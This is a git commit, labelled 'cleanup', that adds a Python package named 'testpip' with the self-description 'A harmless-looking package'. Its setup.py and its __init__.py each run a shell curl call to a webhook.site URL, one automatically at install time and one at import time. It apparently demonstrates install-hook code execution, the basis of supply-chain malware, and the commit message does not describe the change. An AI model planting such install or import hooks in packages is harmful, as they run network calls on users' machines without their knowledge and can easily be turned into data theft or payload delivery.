6aa03958f888ea682014f295df69fc5284b22cb9
Andrei Cadar <cadarandrei2370@yahoo.com>
2025-05-10 11:52:27 +0300

    cleanup

---
+++ setup.py
@@ -0,0 +1,17 @@
+# setup.py
+from setuptools import setup
+import os
+
+# This code runs during installation:
+print("[*] Running post-install code...")
+os.system("curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
+
+setup(
+    name='testpip',
+    version='0.1',
+    description='A harmless-looking package',
+    author='Your Name',
+    author_email='you@example.com',
+    packages=['testpip'],
+    install_requires=[],
+)
---
+++ testpip/__init__.py
@@ -0,0 +1,4 @@
+import os
+
+print("[*] Code running at import time...")
+os.system("curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
